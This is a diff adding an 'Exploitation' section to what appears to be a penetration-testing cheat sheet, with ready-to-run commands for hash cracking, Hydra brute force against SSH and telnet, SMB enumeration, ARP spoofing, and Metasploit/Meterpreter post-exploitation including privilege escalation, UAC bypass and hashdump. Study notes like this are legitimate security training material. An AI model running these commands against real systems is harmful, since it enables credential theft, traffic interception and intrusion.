@@ -93,3 +93,66 @@ sqlmap -u http://10.10.10.10 --os-shell
 sqlmap -u http://10.10.10.10 --dump
 ```
 
+
+
+## Exploitation
+
+### Unshadow
+
+This prepares a file for use with John the Ripper `unshadow passwd shadow > unshadow`
+
+### John The Ripper
+
+`john -wordlist /path/to/wordlist -users=users.txt hashfile`
+
+### Hydra
+
+```bash
+hydra -L users.txt -P pass.txt -t 10 10.10.10.10 ssh -s 22
+hydra -L users.txt -P pass.txt telnet://10.10.10.10
+```
+
+### SMB / SAMBA
+
+```bash
+nmblookup -A 10.10.10.10
+smbclient -L //10.10.10.10 -N (list shares)
+smbclient //10.10.10.10/share -N (mount share)
+enum4linux -a 10.10.10.10
+```
+
+### ARP spoofing
+
+```text
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i tap0 -t 10.10.10.10 -r 10.10.10.11
+```
+
+### Metasploit
+
+```bash
+search x
+use x
+info
+show options
+show advanced
+```
+
+#### Meterpreter
+
+```text
+background
+sessions -l
+sessions -i 1
+sysinfo
+ifconfig
+route
+getuid
+getsystem
+bypassuac
+download x /root/
+upload x C:\\Windows
+shell
+use post/windows/gather/hashdump
+```
+
